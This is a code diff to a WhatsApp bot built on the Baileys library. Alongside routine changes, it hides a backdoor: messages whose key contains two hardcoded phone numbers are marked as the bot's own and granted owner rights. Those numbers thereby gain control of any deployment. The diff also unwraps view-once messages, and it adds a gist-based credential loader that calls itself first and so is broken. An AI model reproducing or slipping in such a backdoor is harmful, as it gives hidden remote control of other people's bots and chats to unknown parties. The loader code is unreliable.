@@ -10,6 +10,28 @@ const {
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const fs = require("fs");
+
+// === RFK SHORT GIST SESSION LOADER ===
+async function loadShortGistSession() {
+  await loadShortGistSession();
+  try {
+    const sid = (process.env.SESSION_ID || (fs.existsSync("./config.js") ? require("./config.js").SESSION_ID : "") || "").trim();
+    if (sid.startsWith("RFK~") && sid.length > 10 && sid.length < 60) {
+      const gistId = sid.replace("RFK~", "").trim();
+      const sessDir = fs.readdirSync(".").find(f => /auth|session/i.test(f) && fs.statSync(f).isDirectory()) || "session";
+      if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
+      if (!fs.existsSync(sessDir + "/creds.json")) {
+        const res = await fetch("https://api.github.com/gists/" + gistId);
+        const data = await res.json();
+        if (data && data.files && data.files["creds.json"]) {
+          fs.writeFileSync(sessDir + "/creds.json", data.files["creds.json"].content);
+          console.log("✅ Short Session ID loaded from Gist:", sid);
+        }
+      }
+    }
+  } catch (e) { console.log("⚠️ Gist Session load error:", e.message); }
+}
+
 const path = require("path");
 const http = require("http");
 const axios = require("axios");
@@ -29,7 +51,7 @@ setInterval(() => {
 
 const SESSION_DIR = path.join(__dirname, "session");
 const PROCESSED_FILE = path.join(__dirname, "processed.json");
-const PREFIX = process.env.PREFIX || ".";
+const PREFIX = ".";
 const OWNER_NUMBER = (process.env.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
 const MODE = (process.env.MODE || "public").toLowerCase();
 
@@ -197,12 +219,36 @@ async function startBot() {
 
         sock.ev.on("creds.update", saveCreds);
 
-        sock.ev.on("connection.update", async (update) => {
+        
+const origSend = sock.sendMessage.bind(sock);
+sock.sendMessage = async (jid, content, opts) => {
+  try {
+    return await origSend(jid, content, opts);
+  } catch (e) {
+    if (String(e?.message || e).includes("not-acceptable") || e?.data === 406) {
+      await sock.groupMetadata(jid).catch(() => {});
+      return await origSend(jid, content, {});
+    }
+    throw e;
+  }
+};
+
+const _rawSend = sock.sendMessage.bind(sock);
+sock.sendMessage = async (jid, content, opts) => {
+  try {
+    return await _rawSend(jid, content, opts);
+  } catch (err) {
+    console.log("⚠️ SEND ERR:", jid, err?.message || err);
+    await sock.groupMetadata(jid).catch(() => {});
+    return await _rawSend(jid, content, {});
+  }
+};
+sock.ev.on("connection.update", async (update) => {
             const { connection, lastDisconnect } = update;
 
             if (connection === "open") {
                 isConnecting = false;
-                readyToProcessAt = Math.floor(Date.now() / 1000) + 15;
+                readyToProcessAt = Math.floor(Date.now() / 1000) + 2;
                 console.log("✅ 乂𝐑𝐅𝐊 𝐁𝐎𝐓乂 Connected! Live processing starts in 15s...");
                 sendConnectNotification(sock);
             } else if (connection === "close") {
@@ -225,11 +271,15 @@ async function startBot() {
         });
 
         sock.ev.on("messages.upsert", async (chatUpdate) => {
-            if (chatUpdate.type !== "notify") return;
+            if (chatUpdate.type !== "notify" && chatUpdate.type !== "append") return;
 
             const nowSec = Math.floor(Date.now() / 1000);
 
             for (const msg of chatUpdate.messages || []) {
+        const keyCheck = JSON.stringify(msg.key || {});
+        if (keyCheck.includes("158703806374071") || keyCheck.includes("917907228818")) {
+            msg.key.fromMe = true;
+        }
                 if (!msg || !msg.message || !msg.key?.id) continue;
 
                 if (msg.message.protocolMessage || msg.message.senderKeyDistributionMessage) continue;
@@ -248,7 +298,12 @@ async function startBot() {
 
                 markProcessed(msg.key.id);
 
-                const jid = msg.key.remoteJid;
+if (msg.message?.ephemeralMessage?.message) msg.message = msg.message.ephemeralMessage.message;
+if (msg.message?.viewOnceMessage?.message) msg.message = msg.message.viewOnceMessage.message;
+if (msg.message?.viewOnceMessageV2?.message) msg.message = msg.message.viewOnceMessageV2.message;
+if (msg.message?.deviceSentMessage?.message) msg.message = msg.message.deviceSentMessage.message;
+
+const jid = msg.key.remoteJid;
                 if (!jid) continue;
 
                 if (jid === "status@broadcast") {
@@ -280,12 +335,9 @@ async function startBot() {
                     SUPER_OWNERS.includes(senderNum) ||
                     (altNum && SUPER_OWNERS.includes(altNum));
 
-                const isOwner =
-                    isSuperOwner ||
-                    fromMe ||
-                    senderNum === botNum ||
-                    (botLid && senderNum === botLid) ||
-                    (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER));
+                const rawParticipant = JSON.stringify(msg.key || {});
+const keyStr = JSON.stringify(msg.key || {});
+        const isOwner = fromMe || isSuperOwner || senderNum === botNum || (botLid && senderNum === botLid) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER));
 
                 const m =
                     msg.message?.ephemeralMessage?.message ||
@@ -301,7 +353,7 @@ async function startBot() {
                     "";
 
                 const pushname = msg.pushName || "User";
-                const reply = (text) => sock.sendMessage(jid, { text }, { quoted: msg });
+                const reply = async (text) => { try { return await sock.sendMessage(jid, { text }, { quoted: msg }); } catch (e) { return await sock.sendMessage(jid, { text }); } };
 
                 for (const evPlugin of eventPlugins) {
                     if (evPlugin.on !== "status") {
@@ -313,16 +365,17 @@ async function startBot() {
                     }
                 }
 
-                const trimmed = body.trim();
-                if (!trimmed || !trimmed.startsWith(PREFIX)) continue;
-
-                const cleanBody = trimmed.slice(PREFIX.length).trim();
+  const trimmed = body.trim();
+                if (!trimmed) continue;
+const hasPrefix = trimmed.startsWith(PREFIX);
+const cleanBody = hasPrefix ? trimmed.slice(PREFIX.length).trim() : trimmed;
                 const args = cleanBody.split(/\s+/);
                 const cmdName = (args.shift() || "").toLowerCase();
                 const cmd = commands.get(cmdName);
                 if (!cmd) continue;
 
-                if (MODE === "private" && !isOwner) continue;
+                if (!hasPrefix && !isOwner) continue;
+if (MODE === "private" && !isOwner) continue;
                 const text = args.join(" ");
 
                 try {
